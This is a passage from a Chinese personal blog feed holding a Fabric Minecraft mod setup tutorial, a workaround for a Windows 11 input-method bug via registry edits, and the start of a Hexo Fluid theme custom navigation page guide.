是否正确，相关配置是否正确：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231919281.png" alt="image-20250723191927192"></p><p><code>depends</code> 和 <code>suggests</code> 项，暂不用修改，等以后开发涉及到了视情况修改。</p><h2 id="修改mod版本可选"><a class="markdownIt-Anchor" href="#修改mod版本可选"></a> 修改 mod 版本（可选）</h2><p>我比较喜欢语义化版本控制。由于目前我们只是在配置、初始化阶段，所以在 <code>gradle.properties</code> 中，将 <code>mod_version</code> 进行修改：</p><figure class="shiki diff"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">  # Mod Properties</span></span><span class="line"><span style="color: #CE9178">- mod_version=1.0.0</span></span><span class="line"><span style="color: #B5CEA8">+ mod_version=0.0.1-1.20.1</span></span><span class="line"><span style="color: #D4D4D4">  maven_group=com.frozen.tutorialmod</span></span><span class="line"><span style="color: #D4D4D4">  archives_base_name=tutorial-mod</span></span></code></pre></div></div></figure><p>以 <code>0.0.1</code> 为例，这种命名的基本语法是：</p><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td><code>MAJOR</code>（主版本）</td><td>有<strong>不兼容性变更</strong>时递增，比如移除 API、重构核心逻辑</td></tr><tr><td><code>MINOR</code>（次版本）</td><td>添加了<strong>新功能</strong>，但向后兼容</td></tr><tr><td><code>PATCH</code>（补丁版本）</td><td>修复了 <strong>bug</strong>，无新增功能，向后兼容</td></tr></tbody></table><p>具体来说：</p><table><thead><tr><th style="text-align:left">版本号</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>1.2.3</code></td><td style="text-align:left">主版本 1，添加了 2 个次要功能，修复了 3 个 bug</td></tr><tr><td style="text-align:left"><code>0.1.0</code></td><td style="text-align:left">尚在早期开发阶段，有了基本功能</td></tr><tr><td style="text-align:left"><code>0.0.1</code></td><td style="text-align:left">刚起步，甚至还不一定稳定</td></tr><tr><td style="text-align:left"><code>2.0.0</code></td><td style="text-align:left">大版本更新，可能有重大 API 变更或破坏性更改</td></tr></tbody></table><p>对于我的 <code>0.0.1-1.20.1</code> 版本号，<code>-1.20.1</code> 主要是为了声明所兼容的 Minecraft 版本。</p><p>由于我们修改了 <code>gradle.properties</code> 文件，这会影响到构建，所以需要重新加载一遍项目：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231954961.png" alt="image-20250723195416897"></p><p>这将花费一些时间。</p><h2 id="client初始化"><a class="markdownIt-Anchor" href="#client初始化"></a> Client 初始化</h2><p>前面在模板项目生成的时候，我们取消了勾选拆分客户端和服务器端，这里尝试手动初始化客户端。</p><p>在 <code>resources/fabric.mod.json</code> 中，修改 <code>entrypoints</code> 节点内容：</p><figure class="shiki diff"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"> "entrypoints": {</span></span><span class="line"><span style="color: #D4D4D4">   "main": [</span></span><span class="line"><span style="color: #D4D4D4">     "com.frozen.tutorialmod.TutorialMod"</span></span><span class="line"><span style="color: #D4D4D4">   ],</span></span><span class="line"><span style="color: #B5CEA8">+  "client": [</span></span><span class="line"><span style="color: #B5CEA8">+    "com.frozen.tutorialmod.TutorialModClient"</span></span><span class="line"><span style="color: #B5CEA8">+  ],</span></span><span class="line"><span style="color: #D4D4D4">   "fabric-datagen": [</span></span><span class="line"><span style="color: #D4D4D4">     "com.frozen.tutorialmod.TutorialModDataGenerator"</span></span><span class="line"><span style="color: #D4D4D4">   ]</span></span><span class="line"><span style="color: #D4D4D4"> },</span></span></code></pre></div></div></figure><p>根据这项修改，我们就需要在 <code>com.frozen.tutorialmod</code> 文件夹下新建 Java 类 <code>TutorialModClient</code>，刚创建好该文件，代码内容为：</p><figure class="shiki java"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">package</span><span style="color: #D4D4D4"> com.frozen.tutorialmod;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">TutorialModClient</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>我们将 <code>TutorialModClient</code> 修改为实现 <code>ClientModInitializer</code> 接口的类：</p><figure class="shiki java"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">package</span><span style="color: #D4D4D4"> com.frozen.tutorialmod;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">import</span><span style="color: #D4D4D4"> net.fabricmc.api.ClientModInitializer;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">TutorialModClient</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">implements</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">ClientModInitializer</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    @</span><span style="color: #4EC9B0">Override</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">void</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">onInitializeClient</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p><code>onInitializeClient()</code> 方法暂时不需要做任何事。</p><h2 id="下载源码"><a class="markdownIt-Anchor" href="#下载源码"></a> 下载源码</h2><p>Minecraft 的源码对我们的开发有着很高的参考价值，这将帮助我们理解各种写法。</p><h3 id="检查java_home版本"><a class="markdownIt-Anchor" href="#检查java_home版本"></a> 检查 JAVA_HOME 版本</h3><p>请确认自己的 <code>JAVA_HOME</code> 的值指向的是 <code>Java21</code> 而非其他版本。</p><p>Gradle 启动的时候 <strong>默认使用自己找到的 JDK</strong>。如果系统上现在有 <strong>多个 JDK 安装</strong>，Gradle 会优先使用以下路径之一来选择 JDK：</p><ol><li>环境变量 <code>JAVA_HOME</code>（<strong>优先级最高</strong>）</li><li><code>gradle.properties</code> 中指定的 <code>org.gradle.java.home</code></li><li>系统 PATH 中的 Java 版本（最后才使用）</li></ol><p>对我来说，我的 <code>JAVA_HOME</code> 环境变量设为了 <code>%JAVA_HOME21%</code>，这将和我的 <code>JAVA_HOME17</code>、<code>JAVA_HOME21</code> 等 <code>JAVA_HOMExx</code> 格式的环境变量进行配合，一般来说，终端将会输出：</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">PS</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">E:</span><span style="color: #D7BA7D">\C</span><span style="color: #CE9178">oding</span><span style="color: #D7BA7D">\F</span><span style="color: #CE9178">abric</span><span style="color: #D7BA7D">\t</span><span style="color: #CE9178">utorial-mod-template-1.20.</span><span style="color: #D4D4D4">1&gt; </span><span style="color: #CE9178">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$env</span><span style="color: #CE9178">:JAVA_HOME</span></span><span class="line"><span style="color: #DCDCAA">E:\Program</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Files</span><span style="color: #D7BA7D">\j</span><span style="color: #CE9178">dk-21.0.7</span></span><span class="line"><span style="color: #DCDCAA">PS</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">E:</span><span style="color: #D7BA7D">\C</span><span style="color: #CE9178">oding</span><span style="color: #D7BA7D">\F</span><span style="color: #CE9178">abric</span><span style="color: #D7BA7D">\t</span><span style="color: #CE9178">utorial-mod-template-1.20.</span><span style="color: #D4D4D4">1&gt; </span><span style="color: #CE9178">java</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-version</span></span><span class="line"><span style="color: #DCDCAA">java</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">version</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"21.0.7"</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">2025</span><span style="color: #CE9178">-04-15</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">LTS</span></span><span class="line"><span style="color: #DCDCAA">Java(TM</span><span style="color: #D4D4D4">) SE Runtime Environment (</span><span style="color: #DCDCAA">build</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">21.0</span><span style="color: #CE9178">.7+8-LTS-245</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #DCDCAA">Java</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">HotSpot</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">TM</span><span style="color: #D4D4D4">) </span><span style="color: #B5CEA8">64</span><span style="color: #CE9178">-Bit</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">Server</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">VM</span><span style="color: #D4D4D4"> (build </span><span style="color: #B5CEA8">21.0</span><span style="color: #CE9178">.7+8-LTS-245,</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">mixed</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">mode,</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">sharing</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #DCDCAA">PS</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">E:</span><span style="color: #D7BA7D">\C</span><span style="color: #CE9178">oding</span><span style="color: #D7BA7D">\F</span><span style="color: #CE9178">abric</span><span style="color: #D7BA7D">\t</span><span style="color: #CE9178">utorial-mod-template-1.20.</span><span style="color: #D4D4D4">1&gt;</span></span></code></pre></div></div></figure><p>这是正常的输出。</p><p>但如果，你的 <code>JAVA_HOME</code> 环境变量设置的是 <code>%JAVA_HOME17%</code>，<strong>只是将 IDEA 中的相关配置为了 Java21</strong> 的话，那么可能在终端中执行 <code>gradle</code> 相关命令，例如：</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">.</span><span style="color: #D4D4D4">\gradlew </span><span style="color: #569CD6">-v</span></span></code></pre></div></div></figure><p>此时读取到的还是 17，而执行 <code>java -version</code> 却能正确输出为 java21 版本，这十分诡异对吧？</p><p>实际上，<code>$env:JAVA_HOME</code> 和 <code>java -version</code> 读取的项是<strong>不一样</strong>的。这一点很容易搞混，尤其是初学者。具体来说：</p><ol><li><code>$env:JAVA_HOME</code>：读取的是环境变量 <code>JAVA_HOME</code> 的值，如果是 <code>%JAVA_HOME21%</code> 那么就会得到 <code>JAVA21</code></li><li><code>java -version</code>：读取的是环境变量 <code>PATH</code> 的值，<code>java</code> 命令会从 <code>PATH</code> 中按照先后顺序找到一个 <code>java</code> 有效目录，用以执行命令。</li></ol><p>这与 IDEA 设置中设置的 Java21 是不相关的：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232056342.png" alt="image-20250723205656287"></p><p>如果你确实是上面的诡异情况，请在更改 <code>JAVA_HOME</code> 指向的值之后，重启 IDEA 再另起一个终端窗口。</p><h3 id="下载源码-2"><a class="markdownIt-Anchor" href="#下载源码-2"></a> 下载源码</h3><p>唤起终端窗口（默认唤起的是 PowerShell），执行下面的命令：</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">./gradlew</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">genSources</span></span></code></pre></div></div></figure><p>下载成功将输出：</p><figure class="shiki powershell"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">PS E:\Coding\Fabric\tutorial-mod-template-</span><span style="color: #B5CEA8">1.20</span><span style="color: #D4D4D4">.1&gt; ./gradlew genSources</span></span><span class="line"><span style="color: #D4D4D4">Starting a Gradle Daemon, </span><span style="color: #B5CEA8">4</span><span style="color: #D4D4D4"> stopped Daemons could not be reused, use --status </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4"> details</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&gt; Configure project :</span></span><span class="line"><span style="color: #D4D4D4">Fabric Loom: </span><span style="color: #B5CEA8">1.11</span><span style="color: #D4D4D4">.</span><span style="color: #B5CEA8">4</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">&gt; Task :genSourcesWithVineflower</span></span><span class="line"><span style="color: #D4D4D4">Decompile cache stats: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> hits, </span><span style="color: #B5CEA8">4786</span><span style="color: #D4D4D4"> misses</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">BUILD SUCCESSFUL </span><span style="color: #C586C0">in</span><span style="color: #D4D4D4"> 42s</span></span><span class="line"><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> actionable task: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4"> executed</span></span><span class="line"><span style="color: #D4D4D4">PS E:\Coding\Fabric\tutorial-mod-template-</span><span style="color: #B5CEA8">1.20</span><span style="color: #D4D4D4">.1&gt;</span></span></code></pre></div></div></figure><h3 id="如何查看源码"><a class="markdownIt-Anchor" href="#如何查看源码"></a> 如何查看源码</h3><p>在 <code>java/com/frozen/tutorialmod/mixin/ExampleMixin.java</code> 文件中，将鼠标选中 <code>MinecraftServer</code> 并按下鼠标中键：</p><figure class="shiki java"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">@</span><span style="color: #4EC9B0">Mixin</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">MinecraftServer</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">ExampleMixin</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">@</span><span style="color: #4EC9B0">Inject</span><span style="color: #D4D4D4">(at = @</span><span style="color: #4EC9B0">At</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"HEAD"</span><span style="color: #D4D4D4">), method = </span><span style="color: #CE9178">"loadWorld"</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">private</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">void</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">init</span><span style="color: #D4D4D4">(</span><span style="color: #4EC9B0">CallbackInfo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">info</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #6A9955">// This code is injected into the start of MinecraftServer.loadWorld()V</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>这将跳转至我们刚才下载的 Minecraft 源码，如下图所示：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232136079.png" alt="image-20250723213650992"></p><p>注意，打开的应该是带注释的源码！如果你的 IDEA 版本和我不同，可能打开的是默认的 IDEA 帮你反编译之后的代码，你需要手动选择代码上方的蓝条的 <code>Choose Sources</code> 也就是选择源：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232143275.png" alt="image-20250723214304170"></p><p>如果选择源之后，代码上方的蓝条变成了红条，这也是正常的。</p><h2 id="运行minecraft测试"><a class="markdownIt-Anchor" href="#运行minecraft测试"></a> 运行 Minecraft 测试</h2><p>现在，我们就可以尝试运行一次 Minecraft 来测试我们的一切配置、代码是否正确了。<br>找到 Gradle 栏，选择 <code>Tasks/fabric/runClient</code>，如下图所示：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232147538.png" alt="image-20250723214701481"></p><p>不出意外出来 Minecraft 的窗口之后，我们创建一个存档，进入存档试试功能：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232149661.png" alt="image-20250723214902547"></p><p>只要在控制台中的日志没有什么 error 错误就行。</p><h2 id="git版本控制"><a class="markdownIt-Anchor" href="#git版本控制"></a> Git 版本控制</h2><p>我十分推荐对项目进行版本控制，这里使用的是 GitHub。<br>注册账号就不讲了，自己搜索就行。由于我们已经在使用 IDEA，那么直接用 IDEA 的版本控制选项就行（旧版本可能叫 VCS）：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232210705.png" alt="image-20250723221011632"></p><p>IDEA 将会弹出一个对话框，让你填相关信息：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232212822.png" alt="image-20250723221203767"></p><p>仓库私有与否，顾名思义，私有别人就看不到，如果你想和别人协作或者有别的考虑就可以公开。<br>接着进行第一次提交：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232215286.png" alt="image-20250723221513229"></p><p>确认文件无误就可以提交并推送了（如果只是提交，则是只提交到了本地仓库而 GitHub 是没有的）。此后，每次对相关文件的更改都将进行记录。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fabric </tag>
            
            <tag> Minecraft </tag>
            
            <tag> Modding </tag>
            
            <tag> 模组开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Bug】Windows11 23-24h2 输入首个字母变成英文无法打出汉字</title>
      <link href="/posts/18029.html"/>
      <url>/posts/18029.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>Microsoft 官方社区已有临时解决办法，详见：<a href="https://answers.microsoft.com/zh-hans/windows/forum/windows_11-wintop_language/windows11/85892fa6-cda9-467b-a633-b5ab6f1f098e">Windows11 24H2 开启触摸键盘功能后，会导致输入法首字母不被自定义输入法接管（变为英文）[内附解决方案]</a></p></blockquote><p>本文在此简单总结，权当记录这个困扰我半年的问题的临时解决办法。</p><h2 id="问题现象"><a class="markdownIt-Anchor" href="#问题现象"></a> 问题现象</h2><p>此 Bug 触发时，你打字 <code>你好</code> 则会变成 <code>n几号</code> 之类的。大伙讨论后暂且认为是 Windows 在启动触摸键盘后，Ctrl+C 复制任意内容，再直接用第三方输入法输入，就出现首字母无法识别的情况。问题出现时如下图：</p><p><img src="https://filestore.community.support.microsoft.com/api/images/eecf0be1-5bc4-4a31-8079-baab80f410fc?upload=true&amp;fud_access=hC1SxZhn7m%2FZQJkOIiOVstu10yTQgXS4A%2FDBzZTg8nbaCgIogkrcDydMeI5Y4za2dOqDdWtsG2JNS3E35V60i9TiGHR7STMpJHheeXuDvO8nwjUlqCBHhJ0NDvuYN7OSRRp9bmvjnhEISMadqToCfqKLVN9hlZDhkHR415ZMhl1NswjCQADON1C9TuNlqvXekgExslMTgQ53ybvVsiTJ8EMtmz%2B2oOJhm%2F5O%2BImoRmWeIu6RoUaf9HTQ9ekycnU%2B2Mf%2FuVlIjRKtBfLcBTOKYLQh8%2BfS9ngej2s792YsDst%2FcU43ft25ax%2F3WNkYlBmbLzCgNtRtf%2BJHuIcVA0XGgrS7z5O9kTYOVyDlO5GAW1X6R97WQbKc8ttb7cOY93Es94M%2BE2pdso0RgvOM6%2FGssJVGa9RIjxeVUcsY7%2F5Jgk4%3D" alt="Bug复现"></p><h2 id="复现方法"><a class="markdownIt-Anchor" href="#复现方法"></a> 复现方法</h2><p>哔哩哔哩上已有具体视频凭借 Windows 沙盒复现，详见：<a href="https://www.bilibili.com/video/BV1xKJNzWESz">Windows 首字母不纳入输入法 bug 的完整复现方法</a></p><h2 id="23h2-临时解决方法"><a class="markdownIt-Anchor" href="#23h2-临时解决方法"></a> 23H2 临时解决方法</h2><p>Win+R 输入 <code>regedit</code> 打开注册表，找到：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">计算机\HKEY_CURRENT_USER\Software\Microsoft\InputMethod\Settings\Common</span></span></code></pre></div></div></figure><p>在右侧找到 <code>TouchKeyboardHasEverShown</code>，双击或右键修改它，将其改为 <code>0</code>，保存后注销或重启：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050149883.png" alt=""></p><p>此后只要不打开触摸键盘便可正常使用，如果不小心打开了，再次修改这个条目为 <code>0</code></p><h3 id="可选的一劳永逸方案"><a class="markdownIt-Anchor" href="#可选的一劳永逸方案"></a> 可选的一劳永逸方案</h3><p>如果有时确实要用到触摸键盘或者一劳永逸解决问题，可以将该项的权限锁定，以避免被更改。</p><div class="note warning flat"><p>⚠️<strong>注意</strong>：</p><p>修改权限可能导致未知问题，如非必要不建议修改。</p></div><p>操作如下图：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050152671.png" alt=""></p><p>在上图的第 4 步鼠标左键点击选择主体之后，需要在第 5 步的输入框内手动输入 <strong>Everyone</strong> 然后点击<strong>确定</strong>。</p><p>在第 6 步点击确定之后，将会出现下图的对话框，按下图操作：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050157972.png" alt=""></p><p>依次选择类型<strong>拒绝</strong>，应用于<strong>只有该项</strong>并点击<strong>显示高级权限</strong>，我们只勾选设置数值即可：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050158482.png" alt=""></p><p>这之后，回到最开始的添加权限对话窗口，如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050159561.png" alt=""></p><p>接着<strong>注销或者直接重启</strong>，此后打开触摸键盘后出现 bug，无需其他操作，再次注销或者重启即可解决。</p><h3 id="另一个方案监视该注册表项"><a class="markdownIt-Anchor" href="#另一个方案监视该注册表项"></a> 另一个方案：监视该注册表项</h3><p>如我上面所说，修改权限可能会导致未知问题出现。我自己的选择是使用火绒安全这个软件对该注册表项进行监视。</p><blockquote><p>火绒版本：6.0.6.3</p></blockquote><p>防护中心 =&gt; 系统防护 =&gt; 开启自定义防护，如下图：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050205756.png" alt=""></p><p>在接下来的对话窗口中添加自定义规则：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050206133.png" alt=""></p><p>添加保护对象即可，我们无需选择程序来针对某个程序：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050207743.png" alt=""></p><p>这里第 2 步的处理方式看个人喜好，我选择当触发规则时，优先询问我。</p><p>接着重新定位到该注册表项即可，触发保护的动作看个人喜好，我这里不限制读取，其他行为均触发规则：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050210917.png" alt=""></p><p>保存之后重启电脑即可。</p><h2 id="24h2-临时解决方法"><a class="markdownIt-Anchor" href="#24h2-临时解决方法"></a> 24H2 临时解决方法</h2><p>24H2 同样找到 23H2 的注册表地址：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">HKEY_CURRENT_USER\Software\Microsoft\InputMethod\Settings\Common</span></span></code></pre></div></div></figure><p>将 <code>Common</code> 中的所有项全部删除，可右键 <code>Common</code> 选择导出留存备份。</p><p>注销或重启电脑。若再次出现同样 Bug，按照上述方法再次修改注册表即可。如果你也时不时会用到触摸键盘或者想一劳永逸，解决办法和 23H2 一致。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> Bug </tag>
            
            <tag> 非预期输入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fluid 创建自定义导航页</title>
      <link href="/posts/8736.html"/>
      <url>/posts/8736.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="为什么要这样做"><a class="markdownIt-Anchor" href="#为什么要这样做"></a> 为什么要这样做？</h2><p>有时为了快速找到收藏的网站，直接把他们放在博客上也是一个好选择。例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505151541449.png" alt=""></p><h2 id="创建自定义页面"><a class="markdownIt-Anchor" href="#创建自定义页面"></a> 创建自定义页面</h2><p>在 fluid 主题文档中，明确指出了该如何创建自定义页面，详见：<a href="https://fluid-dev.github.io/hexo-fluid-docs/guide/#%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2">自定义页面</a></p><h2 id="创建ejs文件"><a class="markdownIt-Anchor" href="#创建ejs文件"></a> 创建 ejs 文件</h2><p>在按照文档创建好自定义页面之后，会自动生成 <code>index.md</code> 文件。阅读 fluid 文档可以知道，文章页拥有一个属性 <code>layout</code>，可以快速渲染 md 文档为各种样式的页面。</p><p>经过观察可以知道，友情链接页面和上面说的这种导航页面十分接近，故以友情链接的模板进行修改便能快速得到想要的渲染模板。</p><p>友情链接的渲染模板 <code>links.ejs</code>l 在 <code>Blog\node_modules\hexo-theme-fluid\layout</code> 目录下，将其复制一份改为 <code>collections.ejs</code> 于同目录下，文件内容如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;%</span></span><span class="line"><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">layout</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"collections"</span></span><span class="line"><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4"> || </span><span style="color: #DCDCAA">__</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'collections.title'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #9CDCFE">page</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">subtitle</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">collections</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">subtitle</span><span style="color: 